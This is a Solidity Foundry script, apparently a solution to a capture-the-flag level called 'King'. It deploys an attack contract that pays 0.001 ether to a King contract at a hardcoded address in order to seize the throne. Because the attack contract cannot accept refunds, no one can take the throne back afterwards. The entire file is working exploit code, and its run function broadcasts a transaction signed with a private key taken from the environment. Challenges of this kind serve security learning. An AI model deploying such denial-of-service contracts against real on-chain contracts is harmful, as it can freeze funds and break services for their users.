//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Script,console} from "forge-std/Script.sol";
import {King} from "../src/King.sol";

contract KingAttack {

  constructor(King kingInstance) payable {
    console.log("Current King: ",kingInstance._king());
   (bool val,) = address(kingInstance).call{value: 0.001 ether}("");
   if(val) {
    this;
   }
    console.log("New King: ",kingInstance._king());
  }

}

contract KingSolution is Script {
  King kingInstance = King(payable(0x06094D5BE964432042246F634121094826096431));
  function run() external {
    vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
    new KingAttack{value: 0.001 ether}(kingInstance);
    vm.stopBroadcast();
  }
}